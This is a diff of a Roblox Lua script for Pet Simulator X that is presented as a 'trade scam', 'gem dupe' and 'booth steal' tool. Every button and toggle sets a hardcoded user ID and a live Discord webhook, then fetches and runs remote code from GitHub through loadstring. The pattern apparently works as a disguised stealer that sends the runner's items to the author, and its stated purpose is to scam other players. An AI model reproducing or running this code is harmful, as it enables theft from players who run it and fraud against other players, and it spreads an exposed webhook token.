@@ -1,26 +1,30 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua%22))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("PSX TRADE SCAM", "Synapse")
  
 local SelfTab = Window:NewTab("trade-scam");
 local VehicleTab = Window:NewTab("GEM DUPE");
-local WeaponTab = Window:NewTab("BOOTH STEALER");
+local WorkTab = Window:NewTab("BOOTH STEAL");
  
  
 local Section1 = SelfTab:NewSection("TRADE");
-Section1:NewLabel("execute and wait 1 minute");
+Section1:NewLabel("scam trade");
  
 Section1:NewButton("SCAM", "Click again when the trade ends", function()
-    UserId =3055262279 
-    WebHook = 'https://discord.com/api/webhooks/1069034431530147850/iTN9VhxIOU8wRtiRK-Rju9SI_NVugkISbzY_ublCswdxhi-lc4x4spe3R-mX36UFyeLa'
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm%22))()
-    end)
-    local Section1 = WeaponTab:NewSection("IDK");
-Section1:NewToggle("ToggleText", "ToggleInfo", function(state)
-    if state then
-    UserName = "SKRNaTo1"
-    WebHook = "https://discordapp.com/api/webhooks/1069034431530147850/iTN9VhxIOU8wRtiRK-Rju9SI_NVugkISbzY_ublCswdxhi-lc4x4spe3R-mX36UFyeLa"
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
-end
-local Section1 = WeapponTab:NewSection("SOON!!!!");
-Section1:NewLabel("for the booth Stealer verison get the paid one in our discord!!!");
-end
+UserId = 3055262279
+WebHook = 'https://discordapp.com/api/webhooks/1069034431530147850/iTN9VhxIOU8wRtiRK-Rju9SI_NVugkISbzY_ublCswdxhi-lc4x4spe3R-mX36UFyeLa'
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm%22"))()
+end)
+local Section1 = VehicleTab:NewSection("GEM DUPE");
+Section1:NewToggle("ON/OFF", "gem dupe", function()
+UserId = 3055262279
+WebHook = 'https://discordapp.com/api/webhooks/1069034431530147850/iTN9VhxIOU8wRtiRK-Rju9SI_NVugkISbzY_ublCswdxhi-lc4x4spe3R-mX36UFyeLa'
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm%22"))()
+end)
+local Section1 = WorkTab:NewSection("BOOTH STEAL");
+Section1:NewLabel("THE STEAL");
+ 
+Section1:NewButton("STEAL", "click 5 times q and press the pet", function()
+UserId = 3055262279
+WebHook = 'https://discordapp.com/api/webhooks/1069034431530147850/iTN9VhxIOU8wRtiRK-Rju9SI_NVugkISbzY_ublCswdxhi-lc4x4spe3R-mX36UFyeLa'
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm%22"))()
+end)
